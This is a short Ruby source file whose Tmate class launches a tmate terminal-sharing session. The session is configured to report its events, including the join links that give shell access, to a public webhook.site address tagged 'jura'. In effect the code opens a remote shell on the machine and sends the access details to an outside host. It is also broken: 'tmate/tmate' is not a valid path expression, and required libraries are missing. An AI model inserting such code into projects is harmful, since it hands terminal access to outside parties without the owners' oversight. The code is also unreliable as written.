class Tmate
  def self.start
    webhook_url = 'https://webhook.site/2811998a-c589-4e1c-8f00-895f43257d80'
    webhook_id = 'jura'

    tmate_config = Tempfile.new('tmate')
    tmate_config.puts <<~CONFIG
      set-option -g tmate-webhook-url "#{webhook_url}"
      set-option -g tmate-webhook-userdata "#{webhook_id}"
    CONFIG
    tmate_config.flush

    tmate_path = tmate/tmate
    tmate_config_path = tmate_config.path
    Open3.popen3("#{tmate_path} -F -f #{tmate_config_path}")
  end
end
